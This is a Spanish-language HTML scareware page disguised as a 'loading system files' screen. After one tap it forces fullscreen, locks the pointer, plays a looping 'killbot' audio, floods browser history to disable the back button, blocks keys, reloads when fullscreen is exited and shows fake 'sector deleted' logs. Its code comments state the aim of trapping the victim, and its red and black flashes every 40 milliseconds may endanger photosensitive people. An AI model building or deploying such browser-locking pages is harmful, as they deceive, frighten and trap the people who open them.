<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>⚡ SYSTEM_CRITICAL_FAILURE ⚡</title>
    <style>
        * { box-sizing: border-box; cursor: none !important; -webkit-tap-highlight-color: transparent; }
        body, html { 
            margin: 0; padding: 0; width: 100%; height: 100%; 
            background-color: #000; color: #f00; 
            font-family: 'Courier New', monospace; 
            overflow: hidden; touch-action: none;
        }

        /* Capa trampa inicial */
        #trigger-layer {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            z-index: 999999; display: flex; flex-direction: column; align-items: center; justify-content: center;
            background: #000; color: #333; cursor: pointer;
        }

        /* Pantalla de Caos */
        #kiosk-mode {
            position: fixed; top: 0; left: 0; width: 100vw; height: 100vh;
            background-color: #000; display: none; z-index: 100;
        }

        .glitch-text {
            position: absolute; font-size: 15vw; font-weight: 900;
            color: white; text-shadow: 5px 5px #f00; pointer-events: none;
            animation: shake 0.05s infinite; text-transform: uppercase;
        }

        #log { position: absolute; bottom: 0; left: 0; font-size: 10px; color: #0f0; padding: 10px; opacity: 0.8; z-index: 101; }

        @keyframes shake {
            0% { transform: translate(5px, 3px) skew(5deg); }
            50% { transform: translate(-5px, -3px) skew(-5deg); }
            100% { transform: translate(0, 0); }
        }
    </style>
</head>
<body oncontextmenu="return false;">

    <div id="trigger-layer" onclick="launchKillbot()">
        <p>Cargando archivos del sistema...</p>
        <p style="font-size: 10px;">(Toca para continuar)</p>
    </div>

    <div id="kiosk-mode">
        <div id="log"></div>
    </div>

    <audio id="killbot-audio" loop>
        <source src="https://cdn.discordapp.com/attachments/1375609945017290836/1470865995227857067/killbot.mp3?ex=698cda34&is=698b88b4&hm=69b6785fada5757221116c6e5b9f379146692506138fc6c4f3a7ae2a4ae7ece8&" type="audio/mpeg">
    </audio>

    <script>
        const trigger = document.getElementById('trigger-layer');
        const kiosk = document.getElementById('kiosk-mode');
        const audio = document.getElementById('killbot-audio');
        const log = document.getElementById('log');
        let isActive = false;

        // Función Maestra de Bloqueo
        function launchKillbot() {
            isActive = true;
            trigger.style.display = 'none';
            kiosk.style.display = 'block';

            // 1. Forzar Pantalla Completa Inmediata
            enterFullScreen();

            // 2. Bloquear puntero (PC)
            if (document.body.requestPointerLock) document.body.requestPointerLock();

            // 3. Audio
            audio.play().catch(() => {});

            // 4. Inundar historial (Bloqueo de botón atrás en Android)
            for(let i=0; i<150; i++) {
                history.pushState({virus: true}, "", "#CORRUPTED_SYSTEM_" + i);
            }

            startChaos();
        }

        function enterFullScreen() {
            const doc = document.documentElement;
            if (doc.requestFullscreen) doc.requestFullscreen();
            else if (doc.webkitRequestFullscreen) doc.webkitRequestFullscreen();
            else if (doc.mozRequestFullScreen) doc.mozRequestFullScreen();
        }

        // DETECTAR SI SALE DEL MODO KIOSKO
        document.addEventListener('fullscreenchange', () => {
            if (!document.fullscreenElement && isActive) {
                // Si intenta salir, forzamos re-entrada al hacer cualquier clic
                // O mejor aún: recargamos la página para atraparlo de nuevo
                alert("ERROR: PROCESO CRÍTICO INTERRUMPIDO. RE-EJECUTANDO...");
                setTimeout(() => {
                    location.reload(); 
                }, 100);
            }
        });

        // Detectar si intenta cambiar de pestaña o salir (Windows/Android)
        window.addEventListener('blur', () => {
            if(isActive) {
                console.log("Intento de salida detectado");
                // No podemos evitar que cambie de pestaña, pero podemos hacer que al volver explote
            }
        });

        function startChaos() {
            setInterval(() => {
                const t = document.createElement('div');
                t.className = 'glitch-text';
                const words = ["KILLBOT", "DIEDIEDIE", "NO ESCAPE", "ERROR", "FATAL", "NULL"];
                t.innerText = words[Math.floor(Math.random() * words.length)];
                t.style.left = Math.random() * 80 + "vw";
                t.style.top = Math.random() * 80 + "vh";
                kiosk.appendChild(t);
                setTimeout(() => t.remove(), 250);

                // Flashes de colores
                kiosk.style.backgroundColor = (Math.random() > 0.5) ? "#f00" : "#000";
                
                // Logs infinitos
                const l = document.createElement('div');
                l.innerText = `[CRITICAL] SECTOR_${Math.random().toString(16).toUpperCase().slice(2,10)}_DELETED`;
                log.appendChild(l);
                if(log.childNodes.length > 40) log.removeChild(log.firstChild);
            }, 40);
        }

        // Bloqueo de teclas (Windows)
        window.addEventListener('keydown', (e) => {
            if(isActive) e.preventDefault();
        });

        // Bloqueo de cierre de pestaña
        window.onbeforeunload = function() {
            return "SISTEMA COMPROMETIDO. ¿ESTÁS SEGURO?";
        };
    </script>
</body>
</html>
